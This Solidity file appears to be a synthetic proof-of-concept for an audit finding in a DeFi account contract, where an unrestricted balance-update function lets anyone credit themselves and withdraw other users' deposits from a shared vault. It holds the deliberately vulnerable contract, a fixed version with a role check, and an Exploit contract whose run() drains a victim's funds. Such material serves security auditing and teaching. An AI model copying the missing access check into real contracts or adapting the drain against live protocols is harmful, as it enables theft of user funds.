// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Elfi AccountFacet.batchUpdateAccountToken — anyone can credit an account
    and withdraw the portfolio vault (Sherlock 2024-05 elfi, H-2).

    SYNTHETIC, cheatcode-free reduction of AccountFacet.sol L68-L71 and
    AssetsProcess.updateAccountToken. The call has no role check and does not
    pull tokens. Withdraw then pays the stored balance out of the shared vault.
    run() does not warp. */

contract Erc20 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PortfolioVault {
    address public book;

    constructor() {
        book = msg.sender;
    }

    function setBook(address book_) external {
        require(msg.sender == book, "book");
        book = book_;
    }

    function pay(address token, address to, uint256 amount) external {
        require(msg.sender == book, "book");
        require(Erc20(token).transfer(to, amount), "pay");
    }
}

contract AccountBook {
    Erc20 public token;
    PortfolioVault public vault;
    mapping(address => bool) public exists;
    mapping(address => uint256) public balanceOf;

    constructor(Erc20 token_, PortfolioVault vault_) {
        token = token_;
        vault = vault_;
    }

    function deposit(address account, uint256 amount) external {
        require(amount != 0, "zero");
        require(token.transferFrom(msg.sender, address(vault), amount), "pull");
        exists[account] = true;
        balanceOf[account] += amount;
    }

    function batchUpdateAccountToken(address account, int256 delta) external virtual {
        require(account != address(0), "account");
        require(exists[account], "exists");
        require(delta != 0, "zero");
        uint256 next = delta > 0 ? balanceOf[account] + uint256(delta) : balanceOf[account] - uint256(-delta);
        // @> VULN: no role check and no token transfer; the caller writes the balance
        balanceOf[account] = next;
    }

    function withdraw(uint256 amount, address to) external {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        vault.pay(address(token), to, amount);
    }
}

contract AccountBookFixed is AccountBook {
    address public guardian;

    constructor(Erc20 token_, PortfolioVault vault_, address guardian_) AccountBook(token_, vault_) {
        guardian = guardian_;
    }

    function batchUpdateAccountToken(address account, int256 delta) external override {
        require(msg.sender == guardian, "role");
        require(account != address(0) && exists[account] && delta != 0, "params");
        if (delta > 0) balanceOf[account] += uint256(delta);
        else balanceOf[account] -= uint256(-delta);
    }
}

contract Exploit {
    address public constant VICTIM = 0x3333333333333333333333333333333333333333;
    uint256 public constant VICTIM_DEPOSIT = 1_000_000e6;
    uint256 public constant SEED = 1e6;
    uint256 public constant STOLEN = 1_000_000e6;

    Erc20 public token;
    PortfolioVault public vault;
    AccountBook public book;
    uint256 public credited;
    uint256 public vaultBefore;
    uint256 public vaultAfter;
    uint256 public taken;

    constructor() {
        token = new Erc20();
        vault = new PortfolioVault();
        book = new AccountBook(token, vault);
        vault.setBook(address(book));
    }

    function run() external {
        token.mint(address(this), VICTIM_DEPOSIT + SEED);
        book.deposit(VICTIM, VICTIM_DEPOSIT);
        book.deposit(address(this), SEED);
        vaultBefore = token.balanceOf(address(vault));
        book.batchUpdateAccountToken(address(this), int256(STOLEN));
        credited = book.balanceOf(address(this));
        book.withdraw(STOLEN, address(this));
        taken = token.balanceOf(address(this));
        vaultAfter = token.balanceOf(address(vault));
        require(credited == SEED + STOLEN, "credit");
        require(taken == STOLEN, "stolen");
        require(vaultBefore - vaultAfter == STOLEN, "vault");
        require(token.balanceOf(VICTIM) == 0, "victim tokens");
        require(book.balanceOf(VICTIM) == VICTIM_DEPOSIT, "victim books");
    }
}
